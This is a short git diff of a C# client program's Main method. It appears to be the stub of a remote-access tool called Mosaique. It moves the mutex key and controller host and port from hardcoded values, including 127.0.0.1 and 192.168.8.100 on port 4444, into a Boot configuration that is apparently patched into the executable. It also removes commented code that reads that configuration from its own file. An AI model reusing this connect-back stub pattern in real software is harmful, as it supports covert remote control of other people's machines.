@@ -21,28 +21,24 @@ namespace Client
         [STAThread]
         static void Main()
         {
-         //   Boot.Initialization();
+            #region ifProd
+            Boot.Initialization();
 
-            //public static string getMutexKey()
-            //{
-            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
-            //    string mutex = readerMutex.ReadToEnd();
-            //    mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
-            //    string mutexKey = mutex.Replace("-STARTmutex-", "");
-            //    return mutexKey;
-            //}
-            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer
+            MutexController.mutexKey = Boot.mutex;
 
-            MutexController.mutexKey = "sdfmlksdmflksdfmlkQQSDQSd5454654EZEZEZZE";// TODO virer    
-            //ZeroFormatter.Formatters.Formatter.RegisterArray<t, RegSeekerMatch>();
-            //ZeroFormatter.Formatters.Formatter<DefaultResolver, Uri>.Register(new UriFormatter<DefaultResolver>());
+            client = new ClientMosaique(Boot.host, Boot.port);
+            #endregion
+
+            #region ifPreProd
+            //MutexController.mutexKey = "sdfmlksdmflksdfmlkQQSDQSd5454654EZEZEZZE";
+            //client = new ClientMosaique("192.168.8.100", 4444);
+            #endregion
+
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             if (MosaiqueLauncher())
             {
-                client = new ClientMosaique("127.0.0.1", 4444);
-                //client = new ClientMosaic(bootController.host, bootController.port);
                 client.connect();
             }
         }
